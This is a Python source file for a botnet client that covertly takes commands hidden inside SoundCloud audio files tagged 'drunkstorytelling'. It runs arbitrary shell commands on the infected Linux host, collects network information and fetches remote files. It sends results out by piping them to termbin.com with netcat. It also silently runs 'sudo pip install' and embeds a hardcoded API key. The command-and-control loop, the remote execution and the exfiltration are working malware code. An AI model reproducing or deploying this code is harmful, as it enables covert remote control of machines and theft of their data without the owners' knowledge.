import crypt
import binascii
import time
import base64
import re

from subprocess import call,check_output
from os import system

#Maybe implement sockets instead of needing this library
try:
    import requests
except ImportError as e:
    system("sudo pip install -q requests")

__HASHTAGS__ = "drunkstorytelling"
__ENC_KEY__ = "CA7BB2E586B2297911228D570632B838D15FAD6776E28F09E0381A28854C02CA"
__IV__ = "DADE575D41C4EDAFE55798C7B869C6E2"


def encrypt(string):
#Aes256-cbc
    return None

def decrypt(string):
    return None

class Bot():
    def __init__(self):
        self.apiKey = "1031bab2ce2395cb86acee82de84cec0"
        self.postData = {"UID":"", "Command":"", "XfilData":"", "Time":""}
        self.oldSongs = []

    #Send requests to soundcloud
    def request(self):
        if len(self.oldSongs) > 10:
                del self.oldSongs[10:len(self.oldSongs)]

        r = requests.get("http://api.soundcloud.com/tracks.json?client_id=" + self.apiKey + "&tags=" + __HASHTAGS__)

        while r.status_code >= 400 and r.status_code <= 499:
            #API Key has been burned, need a new one
            #Post to Termbin, wait hr, query account, If new key found, set self.apiKey. Else repeat(Done in main)
            user = "user-447310327-528627001/"
            r = requests.get("https://soundcloud.com/user-447310327-528627001")
            found = r.text.find(user)

            newKey = r.text[r.text.find('>',found+len(user))+1:r.text.find('<',found+len(user))]

            if newKey != self.apiKey:
                self.apiKey = newKey
                return None
            else:
                self.postData['XfilData'] = "API KEY NO LONGER WORKS"
                return None

        webjson = r.json()
        dl_array = []
        for song_num in xrange(len(webjson)):
            if webjson[song_num]['id'] in self.oldSongs:
                continue

            self.oldSongs.insert(0, webjson[song_num]['id'])

            dl_url = webjson[song_num]['download_url'] + "?client_id=" + self.apiKey
            dl_array.append(dl_url)


        enc_command_array = []
        for song in dl_array:
            print "[+] Song Downloaded"
            r = requests.get(song)
            it = re.finditer('(00[2-7][0-9a-f]){6,}', binascii.hexlify(r.content))

            #Pull out every string in the .wma file
            for obj in it:
                enc_command_array.append(binascii.unhexlify(obj.group(0)))

        print "[*]Done Downloading"
        #Do command validation here
        plaintext = []
        #TODO: Remove the following lines. ****Append them to plaintext!******
        for i in enc_command_array:
            #print "command: " + str(i)
            plaintext.append(str(i))


        """
        for command in enc_command_array:
            try:
                plaintext.append(decrypt(base64.b64decode(command)))
            except Exception:
                continue
        """

        command_array = []
        for index in xrange(len(plaintext)):
            plaintext[index] = plaintext[index].replace(b'\0', '')
            if plaintext[index] == "rce_linux" or plaintext[index] == "take_screenshot" or plaintext[index] == "search_string" or plaintext[index] == "net_info" or plaintext[index] == "rce_linux" or plaintext[index] == "pull_resource":

                command_array.append(plaintext[index])
                plaintext[index+1] = plaintext[index+1].replace(b'\0', '')
                plaintext[index+1] = plaintext[index+1].rstrip('3')
                command_array.append(plaintext[index+1])

        return command_array


    #Post data to termbin
    def post_data(self):
        self.postData['Time'] = time.ctime()
        #encData = base64.b64encode(encrypt(str(self.postData)))

        print check_output(['echo ' + str(self.postData) + ' | nc termbin.com 9999'], shell=True)

    #Take screenshot
    def take_screenshot(self):
        return None

    #Search each file on the system for a specific string
    def search_string(self, string):
        return None

    #Get networking information
    def net_info(self):
        self.postData['Command'] = 'net_info'
        self.postData['XfilData'] = check_output(['ifconfig'])


    #Execute commands locally
    def rce_linux(self, command):
        self.postData['Command'] = 'rce_linux:' + command
        try:
            self.postData['XfilData'] = check_output([command])
        except OSError:
            self.postData['XfilData'] = "Command could not be executed [Check spelling]"


    #Querry website for continuous integration
    def pull_resource(self, info):
        self.postData['Command'] = 'pull_resource'
        r = requests.get(info)
        with open('/tmp/awdf','w') as RESOURCE:
            RESOURCE.write(r.text)


if __name__ == "__main__":

    bender = Bot()

    while True:
        #Figure out how each method will be called once command is returned
        command = bender.request()

        if command is None:
            #Check back in 1hr, this is done if the API key has been burned. Determined in Bot.request()
            time.sleep(60 * 60)
            continue

        count = 0
        for item in command:
            #Might need to change this, depends if the command or the arguments are first
            if count % 2 == 1:
                count+=1
                continue

            if item == 'take_screenshot':
                bender.take_screenshot()
                bender.post_data()

            elif item == 'search_string':
                #This might need to change depending on the order of the items in the array
                bender.search_string(command[count+1])
                bender.post_data()


            elif item == 'net_info':
                bender.net_info()
                bender.post_data()

            elif item == 'rce_linux':
                #This might need to change depending on the order of the items in the array
                bender.rce_linux(command[count+1])
                bender.post_data()

            elif item == 'pull_resource':
                bender.pull_resource(command[count+1])

            count+=1
        #Make random between 2-5hrs
        time.sleep(60 * 60 * 3)